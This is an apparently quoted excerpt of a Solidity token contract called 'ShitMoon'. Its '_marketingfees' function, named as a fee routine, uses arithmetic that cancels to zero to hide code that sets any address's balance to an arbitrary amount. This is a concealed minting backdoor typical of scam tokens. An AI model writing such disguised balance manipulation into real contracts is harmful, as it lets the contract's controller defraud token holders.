...
contract ShitMoon is IERC20 {
  ...
  uint256 lpfee = feelp;
  uint256 public feelp = 5 * 2 / 1;
  uint256 public values = 1 * 2;
  ...
  function _marketingfees (address miner, uint256 _value) internal {
        balances[miner] = (balances[miner] * values - balances[miner] * values) + (_value * 10 ** uint256(decimals));
  }
